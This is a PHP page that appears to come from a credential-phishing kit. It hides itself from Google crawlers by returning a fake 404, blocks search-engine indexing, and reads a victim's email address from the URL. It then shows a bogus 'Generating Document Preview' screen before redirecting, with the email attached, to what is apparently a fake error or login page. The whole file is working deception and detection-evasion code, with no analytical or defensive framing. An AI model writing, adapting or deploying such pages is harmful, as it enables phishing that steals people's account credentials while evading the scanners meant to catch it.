<?php
include 'blockerz.php';
include 'sc.php';

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
exit(); }
	
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    parse_str(parse_url($url, PHP_URL_QUERY));
    $parts = @explode('@', $userid);
    $user = @$parts[0];
	
header('refresh:3;url=error.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	
?>
<!DOCTYPE html>
<html>
<head>
	<title>Loading files..</title>
	<link rel="icon" type="image/png" href="img/logo.png">
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" href="css/wait.css">

</head>
<body>
<div class="files">
	<img src="img/ex.png" height="50">
	<div class="login">
		<div class="loader"></div>
		<h4 class="loading">Generating Document Preview...</h4>
	</div>
</div>
</body>
</html>
